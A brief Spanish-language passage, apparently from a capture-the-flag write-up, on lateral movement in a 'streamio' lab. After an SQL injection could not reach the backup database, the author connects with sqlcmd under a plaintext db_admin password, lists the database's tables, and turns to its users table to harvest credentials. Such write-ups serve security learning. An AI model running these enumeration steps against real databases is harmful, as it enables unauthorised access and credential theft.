Movimiento lateral: Enumerar BD del backup para obtener nuevas credenciales

Enumerar BD streamio_backup (No se pudo enumerar desde SQLi porque el usuario que ejecutaban la BD STREAMIO en uso no tenía permisos para enumerar está BD)

sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT name FROM streamio_backup..sysobjects WHERE xtype= 'U';"

Enumerar la tabla users
